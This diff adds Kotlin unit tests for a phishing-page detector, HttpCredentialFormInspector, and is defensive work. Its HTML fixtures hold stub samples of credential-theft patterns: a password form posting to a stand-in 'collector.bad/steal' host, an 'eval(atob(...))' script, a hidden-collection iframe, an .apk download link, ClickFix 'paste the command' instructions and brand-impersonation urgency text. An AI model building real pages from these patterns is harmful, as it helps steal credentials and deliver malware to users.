@@ -91,4 +91,100 @@ class HttpCredentialFormInspectorTest {
             .inspect("http://login-evil.test/account")
         assertTrue(signals.isEmpty())
     }
+
+    @Test
+    fun `otp and payment forms are detected without a password field`() = runBlocking {
+        val html = """<form><input name="otp_code"><input name="card_number"></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://checkout-evil.test/verify")
+        assertTrue(signals.any { it.ruleId == "SENSITIVE_FORM_UNTRUSTED" })
+    }
+
+    @Test
+    fun `brand impersonation and urgent language are corroborating signals`() = runBlocking {
+        val html = """<h1>Google account security alert</h1>
+            <p>Your account will be suspended, verify immediately.</p>
+            <form action="/login"><input type="password" name="password"></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://secure-check.test/account")
+        assertTrue(signals.any { it.ruleId == "PAGE_BRAND_IMPERSONATION" })
+        assertTrue(signals.any { it.ruleId == "URGENT_ACCOUNT_LANGUAGE" })
+    }
+
+    @Test
+    fun `obfuscated script iframe and executable download are detected with sensitive context`() = runBlocking {
+        val html = """<h1>Account verification required immediately</h1>
+            <form><input type="password" name="password"></form>
+            <iframe src="https://frame.example/collect"></iframe>
+            <script src="https://cdn.example/app.js"></script>
+            <script>eval(atob('abc'))</script>
+            <a href="https://cdn.example/update.apk">Continue</a>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://verify-check.test/account")
+        assertTrue(signals.any { it.ruleId == "SUSPICIOUS_PAGE_CODE" })
+        assertTrue(signals.any { it.ruleId == "EXTERNAL_SCRIPT_WITH_SENSITIVE_FORM" })
+        assertTrue(signals.any { it.ruleId == "SUSPICIOUS_CROSS_DOMAIN_FRAME" })
+        assertTrue(signals.any { it.ruleId == "FORCED_EXECUTABLE_DOWNLOAD" })
+    }
+
+    @Test
+    fun `hidden sensitive input is detected`() = runBlocking {
+        val html = """<form><input type="hidden" name="recovery_token"></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://recover-evil.test/account")
+        assertTrue(signals.any { it.ruleId == "HIDDEN_SENSITIVE_INPUT" })
+    }
+
+    @Test
+    fun `structured parser detects reordered unquoted attributes`() = runBlocking {
+        val html = """<form method=post action=https://collector.bad/steal>
+            <input name=secret autocomplete=current-password type=password></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://portal.test/login")
+        assertTrue(signals.any { it.ruleId == "CREDENTIAL_FORM_EXFIL" })
+    }
+
+    @Test
+    fun `multi-step email login is detected before password appears`() = runBlocking {
+        val html = """<h1>Sign in</h1><form><input type=email name=user_email></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://clean-looking.test/start")
+        assertTrue(signals.any { it.ruleId == "MULTI_STEP_LOGIN_FORM" })
+    }
+
+    @Test
+    fun `identity collection is detected without password or payment fields`() = runBlocking {
+        val html = """<form><input aria-label="Passport number"></form>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://identity-check.test/verify")
+        assertTrue(signals.any { it.ruleId == "IDENTITY_FORM_UNTRUSTED" })
+    }
+
+    @Test
+    fun `clickfix command instructions are a strong malware-delivery signal`() = runBlocking {
+        val html = """<h1>Verification failed</h1><p>Press Windows + R, paste the command, then run the command.</p>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://captcha-fix.test/check")
+        assertTrue(signals.any {
+            it.ruleId == "CLICKFIX_INSTRUCTIONS" && it.strength == SignalStrength.STRONG
+        })
+    }
+
+    @Test
+    fun `fullscreen form and encoded svg payload are corroborating signals`() = runBlocking {
+        val html = """<div style="position:fixed;inset:0"><form><input type=password></form></div>
+            <img src="data:image/svg+xml;base64,PHN2Zz4="/>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://overlay-login.test/")
+        assertTrue(signals.any { it.ruleId == "FULLSCREEN_SENSITIVE_OVERLAY" })
+        assertTrue(signals.any { it.ruleId == "ENCODED_PAGE_PAYLOAD" })
+    }
+
+    @Test
+    fun `legitimate article mentioning brands without a sensitive form remains clean`() = runBlocking {
+        val html = """<article><h1>Google and Microsoft announce security updates</h1></article>"""
+        val signals = HttpCredentialFormInspector(clientReturningHtml(200, html))
+            .inspect("https://technology-news.test/article")
+        assertTrue(signals.isEmpty())
+    }
 }
